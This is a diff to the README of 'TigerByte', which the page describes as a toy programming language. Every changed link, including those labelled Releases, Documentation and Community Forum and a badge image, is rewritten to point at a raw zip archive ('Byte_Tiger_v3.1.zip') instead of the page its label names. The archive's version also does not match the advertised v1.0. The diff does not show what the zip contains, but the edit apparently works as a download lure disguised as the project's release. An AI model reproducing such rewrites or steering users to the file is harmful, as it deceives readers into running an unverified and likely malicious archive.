@@ -7,9 +7,9 @@ Welcome to the world of TigerByte! This toy programming language invites you to 
 ## 📥 Download TigerByte
 
 ### Click Below to Download
-[![Download TigerByte](https://img.shields.io/badge/Download%20TigerByte-v1.0-blue)](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/releases)
+[![Download TigerByte](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip%20TigerByte-v1.0-blue)](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip)
 
-Visit this page to download: [TigerByte Releases](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/releases)
+Visit this page to download: [TigerByte Releases](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip)
 
 ## 🌟 Why Choose TigerByte?
 
@@ -39,7 +39,7 @@ Ensure your system meets the following requirements to run TigerByte smoothly:
 
 ## 🔧 Download & Install
 
-1. Visit the [TigerByte Releases Page](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/releases).
+1. Visit the [TigerByte Releases Page](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip).
 2. Find the latest version available for download.
 3. Click on the appropriate file for your operating system.
 4. Follow the installation prompts that appear on your screen.
@@ -61,8 +61,8 @@ Ensure your system meets the following requirements to run TigerByte smoothly:
 
 For more help, feel free to visit:
 
-- [Documentation](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/wiki): Detailed instructions and guides.
-- [Community Forum](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/discussions): Connect with other users, share your experiences, and ask questions.
+- [Documentation](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip): Detailed instructions and guides.
+- [Community Forum](https://github.com/Phantasmagoriatungapenetrans749/TigerByte/raw/refs/heads/main/games/Byte_Tiger_v3.1.zip): Connect with other users, share your experiences, and ask questions.
 - [Video Tutorials](#): Visual guides to help you get started.
 
 ## 🌍 Join the TigerByte Community
